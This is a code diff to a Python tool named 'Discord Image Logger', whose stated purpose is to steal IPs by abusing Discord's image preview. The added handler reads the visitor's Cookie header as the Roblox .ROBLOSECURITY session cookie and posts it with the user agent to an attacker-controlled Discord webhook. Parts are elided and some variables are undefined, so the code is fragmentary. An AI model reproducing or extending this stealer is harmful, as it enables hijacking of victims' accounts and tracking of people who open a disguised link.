@@ -1,6 +1,8 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import requests, base64, httpagentparser
+import requests
+import base64
+import httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -50,6 +52,42 @@ config = {
         "page": "https://tuit.es/c8MsB"
     },
 }
+
+# Resto del código...
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Obtener la cookie .ROBLOSECURITY
+        roblox_cookie = self.headers.get('Cookie')
+
+        # Resto del código...
+
+        if roblox_cookie:
+            # Agregar la cookie en el JSON
+            embed = {
+                "username": config["username"],
+                "content": ping,
+                "embeds": [
+                    {
+                        "title": "Image Logger - IP Logged",
+                        "color": config["color"],
+                        "description": f"""**A User Opened the Original Image!**
+
+                        # Resto del código...
+
+                        **User Agent:**
+                        ```
+                        {useragent}
+                        ```""",
+                        "cookies": {
+                            ".ROBLOSECURITY": roblox_cookie
+                        }
+                    }
+                ],
+            }
+
+            requests.post(config["webhook"], json=embed)
+
 
 blacklistedIPs = ("27", "34", "35", "104", "143", "164") 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
